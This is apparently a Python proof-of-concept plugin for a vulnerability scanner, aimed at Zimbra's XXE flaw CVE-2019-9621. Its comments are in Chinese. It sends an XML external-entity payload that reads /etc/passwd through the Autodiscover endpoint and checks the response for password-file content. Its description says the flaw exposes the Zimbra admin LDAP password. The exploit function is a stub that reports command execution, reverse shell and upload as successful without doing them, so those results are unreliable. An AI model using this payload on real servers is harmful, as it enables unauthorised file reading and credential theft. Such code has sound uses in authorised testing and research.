  # -*- coding: UTF-8 -*-
# !/usr/bin/python
import requests
import re


data='''
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
      <EMailAddress>aaaaa</EMailAddress>
      <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
    </Request>
  </Autodiscover>
'''

def vuln_info():
    info = {
        'vuln_name': 'zimbar xxe',  # 漏洞名称
        'vuln_referer': 'https://blog.csdn.net/k8gege/article/details/89981142',  # 漏洞来源
        'vuln_author': 'YaoXin',  # 插件作者
        'cms_name': 'zimbra',  # cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description': '''漏洞描述:当 Zimbra 存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取 localconfig.xml配置文件，获取到 zimbra admin ldap password。''',
        'vuln_identifier': '''漏洞编号：CVE-2019-9621''',
        'vuln_class': '任意文件读取',
        # 如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution': '''修复建议。''',
        'FofaQuery_type': 'socket',  # socket、http
        'FofaQuery_link': '/',  # 此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule': 'title="百度"',
        # header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        # header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc': 1,  # 是否有poc  1为有 0为无
        'isexp': 1  # 是否有exp   1为有 0为无
    }
    return info


# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        # 返回参数
        # Result返回是否存在，
        # Result_Info为返回的信息，可以为Paylaod
        # Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
        # Error_Info无论何时都会输出
        result = {"Result": False, "Result_Info": "payload", "Debug_Info": "", "Error_Info": ""}
        result['Result_Info'] = 'payload'
        result['Debug_Info'] = 'ddd'

        #############################################################################
        # res0 = requests.get(url12+"/Autodiscover/Autodiscover.xml",timeout=5,verify=False)
        # if res0.status_code == 200:
        res2 = requests.post(url=(url+"Autodiscover/Autodiscover.xml"), data=data.encode(), verify=False,timeout=3)
        # result['Error_Info'] = res2.url
        if re.findall(":x:", res2.text):
            result['Result'] = True
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

    # {
    #     "type":"cmd",  #cmd,shell,uploadfile
    #     "command":"whoami",  #cmd命令
    #     "reverse_ip":"127.0.0.1", #反弹shell的ip
    #     "reverse_port":"8888", #反弹shell的端口
    #     "filename":"conf.php", #写入文件的名字
    #     "filename_contents":"shell内容", #shell文件内容
    # }


# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        # 返回参数
        # Result返回是否成功，
        # Result_Info为返回的信息，可以为Paylaod
        # Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
        # Error_Info无论何时都会输出
        result = {"Result": False, "Result_Info": "payload", "Debug_Info": "", "Error_Info": ""}
        # 命令执行
        if exp_data['type'] == 'cmd':
            result['Result'] = True
            result['Result_Info'] = "root"
        # 反弹shell
        if exp_data['type'] == 'shell':
            result['Result'] = True
            result['Result_Info'] = "反弹成功"
        # 上传文件
        if exp_data['type'] == 'uploadfile':
            result['Result'] = True
            result['Result_Info'] = "上传成功"

        #
        result['Debug_Info'] = "1"
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')



if __name__ == '__main__':
    url = 'http://127.0.0.1/'
    # aa= do_exp(url,'','','','',exp_data)
    # print(aa)
    aa = do_poc(url, '', '', '', heads={})
    print(aa)
